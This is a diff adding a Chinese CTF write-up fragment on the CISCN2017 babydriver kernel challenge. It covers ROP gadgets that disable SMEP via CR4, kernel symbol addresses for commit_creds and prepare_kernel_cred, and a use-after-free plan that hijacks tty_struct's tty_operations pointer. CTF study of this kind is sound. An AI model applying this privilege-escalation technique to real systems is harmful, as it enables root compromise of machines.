@@ -213,4 +213,137 @@ int main()
 
 ## CISCN2017 babydriver
 
-1
+开了smep，找俩gadget🐏了
+
+```c
+    rop[i++] = 0xffffffff810d238d;      // pop rdi; ret;
+    rop[i++] = 0x6f0;
+    rop[i++] = 0xffffffff81004d80;      // mov cr4, rdi; pop rbp; ret;
+```
+
+函数地址白给
+
+```c
+/ $ grep prepare_kernel_cred /proc/kallsyms
+ffffffff810a1810 T prepare_kernel_cred
+ffffffff81d91890 R __ksymtab_prepare_kernel_cred
+ffffffff81dac968 r __kcrctab_prepare_kernel_cred
+ffffffff81db9450 r __kstrtab_prepare_kernel_cred
+/ $ grep commit_creds /proc/kallsyms
+ffffffff810a1420 T commit_creds
+ffffffff81d88f60 R __ksymtab_commit_creds
+ffffffff81da84d0 r __kcrctab_commit_creds
+ffffffff81db948c r __kstrtab_commit_creds
+```
+
+利用uaf控制`tty_struct`结构体，大小为0x2e0，可以通过打开/dev/ptmx得到
+
+```c
+struct tty_struct {
+	int	magic;
+	struct kref kref;
+	struct device *dev;
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+	int index;
+	/* Protects ldisc changes: Lock tty not pty */
+	struct ld_semaphore ldisc_sem;
+	struct tty_ldisc *ldisc;
+	struct mutex atomic_write_lock;
+	struct mutex legacy_mutex;
+	struct mutex throttle_mutex;
+	struct rw_semaphore termios_rwsem;
+	struct mutex winsize_mutex;
+	spinlock_t ctrl_lock;
+	spinlock_t flow_lock;
+	/* Termios values are protected by the termios rwsem */
+	struct ktermios termios, termios_locked;
+	struct termiox *termiox;	/* May be NULL for unsupported */
+	char name[64];
+	struct pid *pgrp;		/* Protected by ctrl lock */
+	struct pid *session;
+	unsigned long flags;
+	int count;
+	struct winsize winsize;		/* winsize_mutex */
+	unsigned long stopped:1,	/* flow_lock */
+		      flow_stopped:1,
+		      unused:BITS_PER_LONG - 2;
+	int hw_stopped;
+	unsigned long ctrl_status:8,	/* ctrl_lock */
+		      packet:1,
+		      unused_ctrl:BITS_PER_LONG - 9;
+	unsigned int receive_room;	/* Bytes free for queue */
+	int flow_change;
+	struct tty_struct *link;
+	struct fasync_struct *fasync;
+	wait_queue_head_t write_wait;
+	wait_queue_head_t read_wait;
+	struct work_struct hangup_work;
+	void *disc_data;
+	void *driver_data;
+	spinlock_t files_lock;		/* protects tty_files list */
+	struct list_head tty_files;
+#define N_TTY_BUF_SIZE 4096
+	int closing;
+	unsigned char *write_buf;
+	int write_cnt;
+	/* If the tty has a pending do_SAK, queue it here - akpm */
+	struct work_struct SAK_work;
+	struct tty_port *port;
+} __randomize_layout;
+```
+
+`tty_struct`中的`tty_operations`
+
+```c
+struct tty_operations {
+	struct tty_struct * (*lookup)(struct tty_driver *driver,
+			struct file *filp, int idx);
+	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+	int  (*open)(struct tty_struct * tty, struct file * filp);
+	void (*close)(struct tty_struct * tty, struct file * filp);
+	void (*shutdown)(struct tty_struct *tty);
+	void (*cleanup)(struct tty_struct *tty);
+	int  (*write)(struct tty_struct * tty,
+		      const unsigned char *buf, int count);
+	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+	void (*flush_chars)(struct tty_struct *tty);
+	int  (*write_room)(struct tty_struct *tty);
+	int  (*chars_in_buffer)(struct tty_struct *tty);
+	int  (*ioctl)(struct tty_struct *tty,
+		    unsigned int cmd, unsigned long arg);
+	long (*compat_ioctl)(struct tty_struct *tty,
+			     unsigned int cmd, unsigned long arg);
+	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+	void (*throttle)(struct tty_struct * tty);
+	void (*unthrottle)(struct tty_struct * tty);
+	void (*stop)(struct tty_struct *tty);
+	void (*start)(struct tty_struct *tty);
+	void (*hangup)(struct tty_struct *tty);
+	int (*break_ctl)(struct tty_struct *tty, int state);
+	void (*flush_buffer)(struct tty_struct *tty);
+	void (*set_ldisc)(struct tty_struct *tty);
+	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+	void (*send_xchar)(struct tty_struct *tty, char ch);
+	int (*tiocmget)(struct tty_struct *tty);
+	int (*tiocmset)(struct tty_struct *tty,
+			unsigned int set, unsigned int clear);
+	int (*resize)(struct tty_struct *tty, struct winsize *ws);
+	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+	int (*get_icount)(struct tty_struct *tty,
+				struct serial_icounter_struct *icount);
+	int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
+	int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
+	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
+#ifdef CONFIG_CONSOLE_POLL
+	int (*poll_init)(struct tty_driver *driver, int line, char *options);
+	int (*poll_get_char)(struct tty_driver *driver, int line);
+	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+	int (*proc_show)(struct seq_file *, void *);
+} __randomize_layout;
+```
+
+在`tty_struct`中把`tty_operations`劫持到`fake_tty_operations`，利用函数指针控制执行
+
